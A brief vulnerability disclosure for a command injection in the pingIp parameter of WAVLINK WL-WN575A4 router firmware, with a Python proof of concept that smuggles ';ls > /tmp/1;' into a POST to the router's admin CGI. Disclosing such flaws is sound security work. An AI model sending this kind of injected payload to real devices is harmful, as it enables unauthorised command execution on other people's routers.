# command injection

## WAVLINK_WL_WN575A4

version: 20220801

## Description:

There is a command injection in adm.cgi/ping_test

## Source:

you may download it from : https://www.wavlink.com/zh_cn/firmware/details/a3d6df692e.html

## Analyse:


![](5.png)

get value from pingIp, concate and call system, cause command injection



## POC
```
url = "http://192.168.0.1/cgi-bin/set_sys_adm.cgi"
payload = ';ls > /tmp/1;' + '\n'

r = requests.post(url, data={ 'page':'sysAdm','pingIp': payload})
``` 
